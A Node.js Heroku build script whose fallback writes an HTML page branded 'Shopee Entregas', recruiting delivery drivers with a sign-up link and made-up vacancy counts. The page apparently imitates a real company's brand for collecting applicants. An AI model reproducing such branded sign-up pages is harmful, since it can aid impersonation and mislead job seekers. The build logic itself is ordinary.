/**
 * Script para construir a aplicação para deploy no Heroku
 */

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

console.log('🚀 Iniciando build para Heroku...');

// Verificar se estamos no ambiente do Heroku
const isHeroku = process.env.PORT && process.env.DYNO;
const buildDir = path.join(__dirname, 'dist');

try {
  console.log('📋 Verificando ambiente...');
  console.log(`📊 Diretório atual: ${process.cwd()}`);
  console.log(`📊 Node.js: ${process.version}`);
  
  // Construir para produção
  if (!fs.existsSync(buildDir)) {
    fs.mkdirSync(buildDir, { recursive: true });
  }
  
  console.log('🔨 Construindo frontend para produção...');
  try {
    execSync(`npm run build`, { stdio: 'inherit' });
    console.log('✅ Build do frontend concluído com sucesso!');
  } catch (err) {
    console.error('❌ Erro ao construir frontend:', err.message);
    console.log('⚠️ Criando build de contingência...');
    
    // Criar HTML de contingência
    createContingencyHtml();
  }
  
  // Verificar se o build foi criado corretamente
  checkBuildFiles();
  
  // Verificar e copiar páginas HTML estáticas
  copyStaticHtmlPages();
  
  console.log('🎉 Build para Heroku concluído com sucesso!');
} catch (err) {
  console.error('❌ Erro durante o build:', err);
  console.log('⚠️ Criando build de contingência...');
  createContingencyHtml();
}

/**
 * Verifica se os arquivos de build foram criados corretamente
 */
function checkBuildFiles() {
  console.log('🔍 Verificando arquivos de build...');
  
  const clientDist = path.join(__dirname, 'client/dist');
  const dist = path.join(__dirname, 'dist');
  
  // Verificar diretório client/dist
  if (fs.existsSync(clientDist)) {
    console.log(`✅ Diretório client/dist encontrado`);
    const files = fs.readdirSync(clientDist);
    console.log(`📁 ${files.length} arquivos encontrados em client/dist`);
    
    // Copiar arquivos para pasta dist se necessário
    if (!fs.existsSync(path.join(dist, 'index.html'))) {
      console.log('📋 Copiando arquivos de client/dist para dist...');
      copyDirectory(clientDist, dist);
    }
  } else {
    console.log(`⚠️ Diretório client/dist não encontrado`);
  }
  
  // Verificar diretório dist
  if (fs.existsSync(dist)) {
    console.log(`✅ Diretório dist encontrado`);
    const files = fs.readdirSync(dist);
    console.log(`📁 ${files.length} arquivos encontrados em dist`);
    
    // Verificar index.html
    if (fs.existsSync(path.join(dist, 'index.html'))) {
      console.log('✅ index.html encontrado em dist');
    } else {
      console.log('⚠️ index.html não encontrado em dist');
      createContingencyHtml();
    }
  } else {
    console.log(`⚠️ Diretório dist não encontrado`);
    fs.mkdirSync(dist, { recursive: true });
    createContingencyHtml();
  }
}

/**
 * Cria uma página HTML de contingência caso o build falhe
 */
function createContingencyHtml() {
  console.log('📝 Criando página HTML de contingência...');
  
  const html = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Shopee Entregas</title>
  <style>
    :root {
      --primary-color: #ee4d2d;
      --primary-dark: #d03a1b;
      --text-color: #333;
      --light-bg: #f8f9fa;
      --border-radius: 8px;
      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
      --transition: all 0.3s ease;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      line-height: 1.6;
      color: var(--text-color);
      background-color: var(--light-bg);
    }
    
    header {
      background-color: var(--primary-color);
      padding: 2rem 1rem;
      color: white;
      text-align: center;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 2rem 1rem;
    }
    
    .hero {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: var(--card-shadow);
      text-align: center;
    }
    
    .hero h2 {
      color: var(--primary-color);
      margin-bottom: 1rem;
    }
    
    .hero p {
      margin-bottom: 1.5rem;
      font-size: 1.1rem;
    }
    
    .cta-button {
      display: inline-block;
      background-color: var(--primary-color);
      color: white;
      padding: 0.8rem 1.5rem;
      text-decoration: none;
      border-radius: 4px;
      font-weight: bold;
      transition: var(--transition);
    }
    
    .cta-button:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
    }
    
    .benefits {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
      gap: 1.5rem;
      margin-bottom: 2rem;
    }
    
    .benefit-card {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 1.5rem;
      box-shadow: var(--card-shadow);
      transition: var(--transition);
    }
    
    .benefit-card:hover {
      transform: translateY(-5px);
    }
    
    .benefit-card h3 {
      color: var(--primary-color);
      margin-bottom: 0.8rem;
    }
    
    .regions {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 1.5rem;
      margin-bottom: 2rem;
      box-shadow: var(--card-shadow);
    }
    
    .regions h2 {
      color: var(--primary-color);
      margin-bottom: 1rem;
      text-align: center;
    }
    
    .region-list {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 1rem;
      margin-top: 1rem;
    }
    
    .region-item {
      background-color: var(--light-bg);
      padding: 0.8rem;
      border-radius: 4px;
      display: flex;
      justify-content: space-between;
    }
    
    .region-name {
      font-weight: bold;
    }
    
    .region-vacancies {
      background-color: var(--primary-color);
      color: white;
      font-size: 0.8rem;
      padding: 0.2rem 0.5rem;
      border-radius: 12px;
    }
    
    footer {
      text-align: center;
      padding: 1.5rem;
      margin-top: 2rem;
      border-top: 1px solid #ddd;
      color: #666;
    }
  </style>
</head>
<body>
  <header>
    <h1>Shopee Entregas</h1>
    <p>Portal do Entregador Parceiro</p>
  </header>
  
  <div class="container">
    <section class="hero">
      <h2>Seja um Entregador Parceiro da Shopee</h2>
      <p>Junte-se à maior plataforma de comércio eletrônico da região. Tenha flexibilidade de horários e aumente sua renda!</p>
      <a href="/cadastro" class="cta-button">Quero Me Cadastrar</a>
    </section>
    
    <section class="benefits">
      <div class="benefit-card">
        <h3>Horários Flexíveis</h3>
        <p>Você decide quando quer trabalhar. Faça entregas nos horários que se adaptam à sua rotina.</p>
      </div>
      <div class="benefit-card">
        <h3>Ganhos Semanais</h3>
        <p>Receba seus pagamentos toda semana, sem atrasos. Quanto mais entregas, maiores seus ganhos.</p>
      </div>
      <div class="benefit-card">
        <h3>Suporte Dedicado</h3>
        <p>Conte com nossa equipe de suporte para ajudar em qualquer situação, 24 horas por dia, 7 dias por semana.</p>
      </div>
      <div class="benefit-card">
        <h3>Seguro Proteção</h3>
        <p>Trabalhe com tranquilidade sabendo que está protegido durante suas entregas com nosso seguro exclusivo.</p>
      </div>
    </section>
    
    <section class="regions">
      <h2>Regiões com Vagas Abertas</h2>
      <p>Estamos com vagas em diversas regiões do Brasil. Confira as oportunidades disponíveis:</p>
      
      <div class="region-list">
        <div class="region-item">
          <span class="region-name">São Paulo</span>
          <span class="region-vacancies">26 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Rio de Janeiro</span>
          <span class="region-vacancies">18 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Minas Gerais</span>
          <span class="region-vacancies">12 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Bahia</span>
          <span class="region-vacancies">9 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Paraná</span>
          <span class="region-vacancies">8 vagas</span>
        </div>
      </div>
    </section>
  </div>
  
  <footer>
    <p>&copy; ${new Date().getFullYear()} Shopee Entregas. Todos os direitos reservados.</p>
  </footer>

  <script>
    // Carregar os dados do localStorage
    document.addEventListener('DOMContentLoaded', function() {
      const cep = localStorage.getItem('cep');
      if (cep) {
        console.log('CEP recuperado do localStorage:', cep);
      }
      
      const userData = localStorage.getItem('userData');
      if (userData) {
        console.log('Dados do usuário recuperados:', JSON.parse(userData));
      }
    });
  </script>
</body>
</html>`;
  
  // Criar diretório dist se não existir
  const distDir = path.join(__dirname, 'dist');
  if (!fs.existsSync(distDir)) {
    fs.mkdirSync(distDir, { recursive: true });
  }
  
  // Escrever o arquivo HTML
  fs.writeFileSync(path.join(distDir, 'index.html'), html);
  console.log('✅ Página HTML de contingência criada com sucesso!');
}

/**
 * Copia um diretório de origem para um destino
 */
function copyDirectory(src, dest) {
  if (!fs.existsSync(dest)) {
    fs.mkdirSync(dest, { recursive: true });
  }
  
  const entries = fs.readdirSync(src, { withFileTypes: true });
  
  for (const entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    
    if (entry.isDirectory()) {
      copyDirectory(srcPath, destPath);
    } else {
      fs.copyFileSync(srcPath, destPath);
      console.log(`📋 Copiado: ${srcPath} -> ${destPath}`);
    }
  }
}

/**
 * Verifica e copia as páginas HTML estáticas
 */
function copyStaticHtmlPages() {
  console.log('🔍 Verificando páginas HTML estáticas...');
  
  const staticHtmlDir = path.join(__dirname, 'static_html');
  if (fs.existsSync(staticHtmlDir)) {
    console.log(`✅ Diretório static_html encontrado`);
    
    try {
      // Criar diretório static_html no destino
      const destDir = path.join(__dirname, 'dist', 'static_html');
      if (!fs.existsSync(destDir)) {
        fs.mkdirSync(destDir, { recursive: true });
      }
      
      // Copiar arquivos HTML
      const files = fs.readdirSync(staticHtmlDir);
      console.log(`📁 ${files.length} arquivos encontrados em static_html`);
      
      for (const file of files) {
        if (file.endsWith('.html')) {
          const srcPath = path.join(staticHtmlDir, file);
          const destPath = path.join(destDir, file);
          fs.copyFileSync(srcPath, destPath);
          console.log(`📋 Página HTML copiada: ${file}`);
        }
      }
      
      console.log('✅ Páginas HTML estáticas copiadas com sucesso!');
    } catch (err) {
      console.error('❌ Erro ao copiar páginas HTML estáticas:', err);
    }
  } else {
    console.log(`⚠️ Diretório static_html não encontrado`);
  }
}